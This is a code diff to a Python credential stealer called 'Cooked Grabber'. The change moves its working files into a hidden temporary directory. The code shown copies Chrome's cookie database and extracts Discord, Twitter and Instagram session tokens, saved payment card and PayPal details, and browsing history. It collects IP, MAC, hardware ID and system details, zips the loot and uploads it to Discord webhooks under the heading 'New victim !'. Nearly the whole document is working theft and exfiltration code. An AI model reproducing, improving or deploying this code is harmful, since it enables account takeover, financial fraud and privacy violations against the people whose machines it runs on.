@@ -24,6 +24,7 @@ from collections import defaultdict
 from zipfile import ZipFile, ZIP_DEFLATED
 from cpuinfo import get_cpu_info
 from multiprocessing import freeze_support
+from tempfile import TemporaryDirectory
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -113,14 +114,14 @@ def decrypt_data(data, key):
         except:
             return ""
 
-def main():
+def main(dirpath):
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
     if not os.path.isfile(filename):
-        copyfile(db_path, filename)
-        SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
-    db = connect(filename)
+        copyfile(db_path, os.path.join(dirpath, 'Cookies.db'))
+        #SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
+    db = connect(os.path.join(dirpath, 'Cookies.db'))
     db.text_factory = lambda b: b.decode(errors="ignore")
     for w in website:
         if w == website[0]:
@@ -197,89 +198,73 @@ def main():
             pass
     db.commit()
     db.close()
-    try:
-        os.remove('Cookies.db')
-    except:
-        pass
     return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]
-
-def replace_new(path):
-    if os.path.exists(path):
-        os.remove(path)
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
     p_lst = get_Personal_data()
     cpuinfo = get_cpu_info()
-    main_info = main()
-    discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
-    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
-    for t_ in main_info[0]:
-        try:
-            lst = get_user_data(t_)
-            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
-            discord_T.add_row([t_, username, email, phone])
-            verified_tokens.append(t_)
-        except:
-            pass
-    for _t in main_info[1]:
-        twitter_T.add_row([_t])
-    for _t_ in main_info[2]:
-        insta_T.add_row(_t_)
-    pay_l = []
-    for _p in main_info[3]:
-        if _p[1] == 1:
-            payment_card = PrettyTable(padding_width=1)
-            payment_card.field_names = ["Brand", "Last 4","Type", "Expiration", "Billing Adress"]
-            payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
-            pay_l.append(payment_card.get_string())
-        elif _p[1] == 2:
-            payment_p = PrettyTable(padding_width=1)
-            payment_p.field_names = ["Email", "Type", "Billing Adress"]
-            payment_p.add_row([_p[0], "Paypal", _p[2]])
-            pay_l.append(payment_p.get_string())
-    files_names = [["Discord Tokens.txt", discord_T], ["Twitter Tokens.txt", twitter_T], ["Instagram Tokens.txt", insta_T]]
-    for x_, y_ in files_names:
-        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
-            replace_new(x_)
-            with open(x_, 'w') as wr:
-                SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
-                wr.write(y_.get_string())
-    replace_new("data.zip")
-    with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
-        SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
-        if ('payment_card' or 'payment_p') in locals():
-            replace_new("Payment Info.txt")
-            with open("Payment Info.txt", 'w') as f:
-                SetFileAttributes("Payment Info.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
-                for i in pay_l:
-                    f.write(f"{i}\n")
-            zip.write("Payment Info.txt")
-            os.remove("Payment Info.txt")
-        replace_new("History.txt")
-        with open('History.txt', 'w') as f:
-            SetFileAttributes("History.txt", win32con.FILE_ATTRIBUTE_HIDDEN), f.write(find_His())
-        zip.write("History.txt")
-        os.remove("History.txt")
-        for name_f, _ in files_names:
-            if os.path.exists(name_f):
-                zip.write(name_f)
-                os.remove(name_f)
-    for URL in DISCORD_WEBHOOK_URLs:
-        webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://c.tenor.com/h3fCM442dCcAAAAC/discord-logo.gif")
-        embed = DiscordEmbed(title='New victim !', color='00FF00')
-        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
-        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
-        embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
-        embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
-        card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
-        embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
-        embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
-        embed.set_timestamp()
-        with open("data.zip", 'rb') as f:
-            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
-        webhook.add_embed(embed)
-        webhook.execute()
-    os.remove("data.zip")
+    with TemporaryDirectory(dir='.') as td:
+        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
+        main_info = main(td)
+        discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
+        discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
+        for t_ in main_info[0]:
+            try:
+                lst = get_user_data(t_)
+                username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
+                discord_T.add_row([t_, username, email, phone])
+                verified_tokens.append(t_)
+            except:
+                pass
+        for _t in main_info[1]:
+            twitter_T.add_row([_t])
+        for _t_ in main_info[2]:
+            insta_T.add_row(_t_)
+        pay_l = []
+        for _p in main_info[3]:
+            if _p[1] == 1:
+                payment_card = PrettyTable(padding_width=1)
+                payment_card.field_names = ["Brand", "Last 4","Type", "Expiration", "Billing Adress"]
+                payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
+                pay_l.append(payment_card.get_string())
+            elif _p[1] == 2:
+                payment_p = PrettyTable(padding_width=1)
+                payment_p.field_names = ["Email", "Type", "Billing Adress"]
+                payment_p.add_row([_p[0], "Paypal", _p[2]])
+                pay_l.append(payment_p.get_string())
+        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T]]
+        for x_, y_ in files_names:
+            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
+                with open(x_, 'w') as wr:
+                    wr.write(y_.get_string())
+        with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
+            if ('payment_card' or 'payment_p') in locals():
+                with open(os.path.join(td, "Payment Info.txt"), 'w') as f:
+                    for i in pay_l:
+                        f.write(f"{i}\n")
+                zip.write("Payment Info.txt")
+                os.remove("Payment Info.txt")
+            with open(os.path.join(td, 'History.txt'), 'w') as f:
+                f.write(find_His())
+            zip.write(os.path.join(td, 'History.txt'))
+            for name_f, _ in files_names:
+                if os.path.exists(name_f):
+                    zip.write(name_f)
+        for URL in DISCORD_WEBHOOK_URLs:
+            webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png")
+            embed = DiscordEmbed(title='New victim !', color='FFA500')
+            embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
+            embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
+            embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
+            embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
+            card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
+            embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
+            embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
+            embed.set_timestamp()
+            with open(os.path.join(td, "data.zip"), 'rb') as f:
+                webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
+            webhook.add_embed(embed)
+            webhook.execute()
 
 if __name__ == "__main__":
     freeze_support()
